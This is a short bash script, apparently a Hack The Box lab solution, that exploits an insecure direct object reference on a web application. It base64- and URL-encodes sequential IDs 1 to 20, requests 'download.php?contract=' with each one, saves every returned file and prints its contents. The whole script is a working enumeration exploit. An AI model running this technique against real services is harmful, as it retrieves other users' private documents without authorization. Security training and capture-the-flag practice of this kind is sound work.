#!/usr/bin/env bash

# HTB target
url="http://83.136.255.106:41350"

for i in {1..20}; do
    # Encode base64 and convert special characters into percent-encoding.
    hash=$(echo -n "$i" | base64 | python3 -c "import sys, urllib.parse; print(urllib.parse.quote(sys.stdin.read().strip()))")

    # shows ID and hash, just to watch the process.
    echo "ID: $i, hash: $hash"

   filename=$(curl -sS -OJ -w "%{filename_effective}" "$url/download.php?contract=$hash" -o /dev/null)

    # Display its content
    cat "$filename"
done



